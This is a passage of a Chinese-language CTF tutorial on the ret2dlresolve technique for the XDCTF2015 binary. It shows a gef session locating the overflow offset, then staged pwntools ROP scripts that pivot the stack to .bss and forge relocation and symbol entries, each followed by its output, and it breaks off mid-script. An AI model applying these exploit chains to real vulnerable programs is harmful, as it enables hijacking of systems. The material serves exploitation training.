class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class=\"line\">[+] Saved as &#x27;$_gef0&#x27;</span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main</span><br><span class=\"line\">Welcome to XDCTF2015~!</span><br><span class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class=\"line\">Program received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\">0x62616164 in ?? ()</span><br><span class=\"line\">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]──────────────────────────────────────────────────────────</span><br><span class=\"line\">$eax   : 0x000000c9</span><br><span class=\"line\">$ebx   : 0x00000000</span><br><span class=\"line\">$ecx   : 0xffffcc6c  →  &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span><br><span class=\"line\">$edx   : 0x00000100</span><br><span class=\"line\">$esp   : 0xffffcce0  →  &quot;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]&quot;</span><br><span class=\"line\">$ebp   : 0x62616163 (&quot;caab&quot;?)</span><br><span class=\"line\">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class=\"line\">$edi   : 0xffffcd50  →  0xffffcd70  →  0x00000001</span><br><span class=\"line\">$eip   : 0x62616164 (&quot;daab&quot;?)</span><br><span class=\"line\">$cs    : 0x00000023</span><br><span class=\"line\">$ss    : 0x0000002b</span><br><span class=\"line\">$ds    : 0x0000002b</span><br><span class=\"line\">$es    : 0x0000002b</span><br><span class=\"line\">$fs    : 0x00000000</span><br><span class=\"line\">$gs    : 0x00000063</span><br><span class=\"line\">$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class=\"line\">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────────────────</span><br><span class=\"line\">[!] Cannot disassemble from $PC</span><br><span class=\"line\">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────────────────</span><br><span class=\"line\">[&#x27;0xffffcce0&#x27;, &#x27;l8&#x27;]</span><br><span class=\"line\">8</span><br><span class=\"line\">0xffffcce0│+0x00: &quot;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]&quot;  ← $esp</span><br><span class=\"line\">0xffffcce4│+0x04: &quot;faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]&quot;</span><br><span class=\"line\">0xffffcce8│+0x08: &quot;gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]&quot;</span><br><span class=\"line\">0xffffccec│+0x0c: &quot;haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]&quot;</span><br><span class=\"line\">0xffffccf0│+0x10: &quot;iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]&quot;</span><br><span class=\"line\">0xffffccf4│+0x14: &quot;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]&quot;</span><br><span class=\"line\">0xffffccf8│+0x18: &quot;kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]&quot;</span><br><span class=\"line\">0xffffccfc│+0x1c: &quot;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]&quot;</span><br><span class=\"line\">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class=\"line\">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class=\"line\">gef➤  pattern search</span><br><span class=\"line\">[!] Syntax</span><br><span class=\"line\">pattern search PATTERN [SIZE]</span><br><span class=\"line\">gef➤  pattern search 0x62616164</span><br><span class=\"line\">[+] Searching &#x27;0x62616164&#x27;</span><br><span class=\"line\">[+] Found at offset 112 (little-endian search) likely</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 1</strong></p>\n<p>这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步</p>\n<ol>\n<li>将栈迁移到bss段。</li>\n<li>控制write函数输出相应字符串。</li>\n</ol>\n<p>这里主要使用了pwntools中的ROP模块。具体代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write cmd=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop.write(<span class=\"number\">1</span>, base_stage + <span class=\"number\">80</span>, <span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>结果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage1.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 120912</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 2</strong></p>\n<p>在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write cmd=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">write_index = (elf.plt[<span class=\"string\">&#x27;write&#x27;</span>] - plt0) / <span class=\"number\">16</span> - <span class=\"number\">1</span></span><br><span class=\"line\">write_index *= <span class=\"number\">8</span></span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(write_index)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>效果如下，仍然输出了cmd对应的字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage2.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 123406</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 3</strong></p>\n<p>这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。</p>\n<p>鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ readelf -r main  </span><br><span class=\"line\">重定位节 &#x27;.rel.dyn&#x27; 位于偏移量 0x318 含有 3 个条目：</span><br><span class=\"line\"> 偏移量     信息    类型              符号值      符号名称</span><br><span class=\"line\">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class=\"line\">0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0</span><br><span class=\"line\">0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0</span><br><span class=\"line\">重定位节 &#x27;.rel.plt&#x27; 位于偏移量 0x330 含有 5 个条目：</span><br><span class=\"line\"> 偏移量     信息    类型              符号值      符号名称</span><br><span class=\"line\">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class=\"line\">0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class=\"line\">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class=\"line\">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class=\"line\">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>\n\n<p>可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = <span class=\"number\">0x607</span></span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(write_got)  <span class=\"comment\"># fake reloc</span></span><br><span class=\"line\">rop.raw(r_info)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage3.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 126063</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 4</strong></p>\n<p>stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607&gt;&gt;8=0x6。因此，我们知道write对应的符号地址为0x8048238。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main</span><br><span class=\"line\">main：     文件格式 elf32-i386</span><br><span class=\"line\">Contents of section .dynsym:</span><br><span class=\"line\"> 80481d8 00000000 00000000 00000000 00000000  ................</span><br><span class=\"line\"> 80481e8 33000000 00000000 00000000 12000000  3...............</span><br><span class=\"line\"> 80481f8 27000000 00000000 00000000 12000000  &#x27;...............</span><br><span class=\"line\"> 8048208 52000000 00000000 00000000 20000000  R........... ...</span><br><span class=\"line\"> 8048218 20000000 00000000 00000000 12000000   ...............</span><br><span class=\"line\"> 8048228 3a000000 00000000 00000000 12000000  :...............</span><br><span class=\"line\"> 8048238 4c000000 00000000 00000000 12000000  L...............</span><br><span class=\"line\"> 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........</span><br><span class=\"line\"> 8048258 0b000000 3c860408 04000000 11001000  ....&lt;...........</span><br><span class=\"line\"> 8048268 1a000000 40a00408 04000000 11001a00  ....@...........</span><br></pre></td></tr></table></figure>\n\n<p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynsym = elf.get_section_by_name(<span class=\"string\">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynstr = elf.get_section_by_name(<span class=\"string\">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">### making fake write symbol</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">32</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span></span><br><span class=\"line\">                )  <span class=\"comment\"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (</span><br><span class=\"line\">    fake_sym_addr - dynsym) / <span class=\"number\">0x10</span>  <span class=\"comment\"># calculate the dynsym index of write</span></span><br><span class=\"line\">fake_write_sym = flat([<span class=\"number\">0x4c</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x12</span>])</span><br><span class=\"line\"><span class=\"comment\">### making fake write relocation</span></span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_write_reloc = flat([write_got, r_info])</span><br><span 